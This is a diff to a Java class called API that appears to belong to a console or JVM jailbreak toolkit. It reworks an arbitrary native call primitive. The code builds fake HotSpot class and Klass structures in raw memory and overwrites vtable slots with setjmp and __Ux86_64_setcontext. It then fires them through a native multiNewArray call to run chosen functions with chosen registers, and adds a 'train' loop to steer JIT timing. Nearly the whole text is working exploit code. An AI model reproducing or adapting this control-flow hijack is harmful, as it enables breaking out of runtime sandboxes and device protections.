@@ -37,7 +37,7 @@ public final class API {
   private static final String ERROR_SYMBOL = "__error";
 
   private static final String MULTI_NEW_ARRAY_METHOD_NAME = "multiNewArray";
-  private static final String MULTI_NEW_ARRAY_METHOD_SIGNATURE = "(Ljava/lang/Class;[I)J";
+  private static final String MULTI_NEW_ARRAY_METHOD_SIGNATURE = "(J[I)J";
 
   private static final String NATIVE_LIBRARY_CLASS_NAME = "java.lang.ClassLoader$NativeLibrary";
   private static final String FIND_METHOD_NAME = "find";
@@ -79,7 +79,7 @@ public final class API {
     return instance;
   }
 
-  private native long multiNewArray(Class componentType, int[] dimensions);
+  private native long multiNewArray(long componentType, int[] dimensions);
 
   private void init() throws Exception {
     initUnsafe();
@@ -258,67 +258,79 @@ public final class API {
     write64(contextBuf + 0xE0, rip);
     write64(contextBuf + 0xF8, rsp);
 
-    write64(contextBuf + 0x110, 0x41414141);
-    write64(contextBuf + 0x118, 0x41414141);
+    write64(contextBuf + 0x110, 0);
+    write64(contextBuf + 0x118, 0);
+  }
+
+  public void train() {
+    for (int i = 0; i < 10000; i++) {
+      call(-1);
+    }
   }
 
   public long call(long func, long arg0, long arg1, long arg2, long arg3, long arg4, long arg5) {
-    long fakeCallKlass = malloc(0x400);
-    long fakeCallKlassVtable = malloc(0x400);
+    long fakeClassOop = malloc(INT64_SIZE);
+    long fakeClass = malloc(0x100);
+    long fakeKlass = malloc(0x200);
+    long fakeKlassVtable = malloc(0x400);
 
-    if (fakeCallKlass == 0 || fakeCallKlassVtable == 0) {
+    if (fakeClassOop == 0 || fakeClass == 0 || fakeKlass == 0 || fakeKlassVtable == 0) {
       throw new IllegalStateException("Could not allocate memory.");
     }
 
-    memset(fakeCallKlass, 0, 0x400);
-
-    for (int i = 0; i < 0x400; i += 8) {
-      write64(fakeCallKlassVtable + i, JVM_NativePath);
-    }
+    write64(fakeClassOop, 0);
+    memset(fakeClass, 0, 0x100);
+    memset(fakeKlass, 0, 0x200);
+    memset(fakeKlassVtable, 0, 0x400);
 
     try {
       long ret = 0;
 
+      // When func is -1, only do one iteration to avoid calling __Ux86_64_setcontext.
+      // This is used to "train" this function to kick in optimization early. Otherwise, it is
+      // possible that optimization kicks in between the calls to setjmp and __Ux86_64_setcontext
+      // leading to different stack layouts of the two calls.
+      int iter = func == -1 ? 1 : 2;
+
       if (jdk11) {
-        long callClass = addrof(Call.class);
-        long callKlass = read64(callClass + 0x98);
+        write64(fakeClassOop + 0x00, fakeClass);
+        write64(fakeClass + 0x98, fakeKlass);
+        write32(fakeKlass + 0xC4, 0); // dimension
+        write64(fakeKlassVtable + 0xD8, JVM_NativePath); // array_klass
 
-        write64(fakeCallKlassVtable + 0x158, setjmp);
-        write64(fakeCallKlass + 0x00, fakeCallKlassVtable);
-        write64(fakeCallKlass + 0x00, fakeCallKlassVtable);
-        write64(callClass + 0x98, fakeCallKlass);
-        multiNewArray(Call.class, MULTI_NEW_ARRAY_DIMENSIONS);
-        write64(callClass + 0x98, callKlass);
+        for (int i = 0; i < iter; i++) {
+          write64(fakeKlass + 0x00, fakeKlassVtable);
+          write64(fakeKlass + 0x00, fakeKlassVtable);
+          if (i == 0) {
+            write64(fakeKlassVtable + 0x158, setjmp); // multi_allocate
+          } else {
+            write64(fakeKlassVtable + 0x158, __Ux86_64_setcontext); // multi_allocate
+          }
+          ret = multiNewArray(fakeClassOop, MULTI_NEW_ARRAY_DIMENSIONS);
 
-        buildContext(
-            fakeCallKlass + 0x00, fakeCallKlass + 0x00, func, arg0, arg1, arg2, arg3, arg4, arg5);
-
-        write64(fakeCallKlassVtable + 0x158, __Ux86_64_setcontext);
-        write64(fakeCallKlass + 0x00, fakeCallKlassVtable);
-        write64(fakeCallKlass + 0x00, fakeCallKlassVtable);
-        write64(callClass + 0x98, fakeCallKlass);
-        ret = multiNewArray(Call.class, MULTI_NEW_ARRAY_DIMENSIONS);
-        write64(callClass + 0x98, callKlass);
+          buildContext(
+              fakeKlass + 0x00, fakeKlass + 0x00, func, arg0, arg1, arg2, arg3, arg4, arg5);
+        }
       } else {
-        long callClass = addrof(Call.class);
-        long callKlass = read64(callClass + 0x68);
+        write64(fakeClassOop + 0x00, fakeClass);
+        write64(fakeClass + 0x68, fakeKlass);
+        write32(fakeKlass + 0xBC, 0); // dimension
+        write64(fakeKlassVtable + 0x80, JVM_NativePath); // array_klass
+        write64(fakeKlassVtable + 0xF0, JVM_NativePath); // oop_is_array
 
-        write64(fakeCallKlassVtable + 0x230, setjmp);
-        write64(fakeCallKlass + 0x10, fakeCallKlassVtable);
-        write64(fakeCallKlass + 0x20, fakeCallKlassVtable);
-        write64(callClass + 0x68, fakeCallKlass);
-        multiNewArray(Call.class, MULTI_NEW_ARRAY_DIMENSIONS);
-        write64(callClass + 0x68, callKlass);
+        for (int i = 0; i < iter; i++) {
+          write64(fakeKlass + 0x10, fakeKlassVtable);
+          write64(fakeKlass + 0x20, fakeKlassVtable);
+          if (i == 0) {
+            write64(fakeKlassVtable + 0x230, setjmp); // multi_allocate
+          } else {
+            write64(fakeKlassVtable + 0x230, __Ux86_64_setcontext); // multi_allocate
+          }
+          ret = multiNewArray(fakeClassOop, MULTI_NEW_ARRAY_DIMENSIONS);
 
-        buildContext(
-            fakeCallKlass + 0x20, fakeCallKlass + 0x20, func, arg0, arg1, arg2, arg3, arg4, arg5);
-
-        write64(fakeCallKlassVtable + 0x230, __Ux86_64_setcontext);
-        write64(fakeCallKlass + 0x10, fakeCallKlassVtable);
-        write64(fakeCallKlass + 0x20, fakeCallKlassVtable);
-        write64(callClass + 0x68, fakeCallKlass);
-        ret = multiNewArray(Call.class, MULTI_NEW_ARRAY_DIMENSIONS);
-        write64(callClass + 0x68, callKlass);
+          buildContext(
+              fakeKlass + 0x20, fakeKlass + 0x20, func, arg0, arg1, arg2, arg3, arg4, arg5);
+        }
       }
 
       if (ret == 0) {
@@ -327,8 +339,10 @@ public final class API {
 
       return read64(ret);
     } finally {
-      free(fakeCallKlassVtable);
-      free(fakeCallKlass);
+      free(fakeKlassVtable);
+      free(fakeKlass);
+      free(fakeClass);
+      free(fakeClassOop);
     }
   }
 
@@ -565,6 +579,4 @@ public final class API {
     System.arraycopy(str.getBytes(), 0, bytes, 0, str.length());
     return bytes;
   }
-
-  private final class Call {}
 }
